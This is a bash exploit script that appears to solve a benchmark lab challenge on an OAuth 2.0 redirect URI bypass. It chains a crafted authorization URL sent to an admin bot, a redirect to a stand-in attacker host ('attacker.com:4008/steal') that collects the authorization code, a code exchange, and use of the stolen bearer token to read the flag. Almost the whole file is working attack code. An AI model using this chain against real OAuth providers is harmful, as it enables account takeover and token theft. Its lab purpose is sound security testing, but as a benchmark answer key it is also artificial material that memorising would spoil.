#!/usr/bin/env bash
# APEX-008-25 — "OAuth 2.0 Redirect URI Bypass" (tags: oauth, account_takeover)
#
# The provider checks `redirect_uri.startsWith("http://app.vulnerable.local")`.
# A prefix is not an origin: `http://app.vulnerable.local.attacker.com:4008` has
# the allowed string at its start and belongs to somebody else entirely. The
# authorization code is delivered there, and a code is a bearer credential until
# it is exchanged.
#
# Four services on four ports, and the exploit visits all four: submit the
# crafted authorization URL to the admin bot, read the code off the attacker's
# collector, exchange it through the app, spend the token at the provider. One
# h5i session throughout, because a stored request carries the authority the
# socket dials — so each hop is `navigate` to that service and then resend the
# request that navigation made.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
. "$(dirname "$0")/lib.sh"
# Only the host is taken from the argument. This benchmark publishes four
# services on four pinned ports and the exploit needs all of them, so which one
# the runner happened to name first decides nothing.
HOST="${URL%:*}"
PROVIDER="${PROVIDER_URL:-$HOST:3008}"
APP="${APP_URL:-$HOST:3009}"
BOT="${BOT_URL:-$HOST:3010}"
COLLECTOR="${COLLECTOR_URL:-$HOST:4008}"
SESSION="apex008-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

field() { python3 -c "import json,sys; print(json.load(sys.stdin).get('$1',''))"; }

# The bot browses from inside the compose network, so the URL it is handed
# names the services the way that network does, not the way this host does.
STEAL="http://app.vulnerable.local.attacker.com:4008/steal"
AUTHORIZE="http://oauth-provider:3008/oauth/authorize?client_id=vulnerable-app&redirect_uri=$STEAL&response_type=code&scope=openid+profile+email+admin&state=pwned"

"$H5I" browser open "$BOT/" --session "$SESSION" --new --capture >/dev/null
send "$SESSION" "$(last "$SESSION")" --create \
    --set method=POST --set path=/bot/visit \
    --set header.Content-Type=application/json \
    --set "json.url=$AUTHORIZE" >/dev/null

"$H5I" browser navigate "$COLLECTOR/api/latest" --session "$SESSION" >/dev/null
LATEST="$(last "$SESSION")"
CODE="$("$H5I" websec show "res_${LATEST#req_}" --session "$SESSION" --raw | body | field code)"

"$H5I" browser navigate "$APP/" --session "$SESSION" >/dev/null
TOKEN="$(send "$SESSION" "$(last "$SESSION")" --create \
    --set method=POST --set path=/api/exchange-code \
    --set header.Content-Type=application/json \
    --set "json.code=$CODE" | body | field access_token)"

"$H5I" browser navigate "$PROVIDER/" --session "$SESSION" >/dev/null
send "$SESSION" "$(last "$SESSION")" --create \
    --set path=/oauth/userinfo \
    --set "header.Authorization=Bearer $TOKEN" | flag
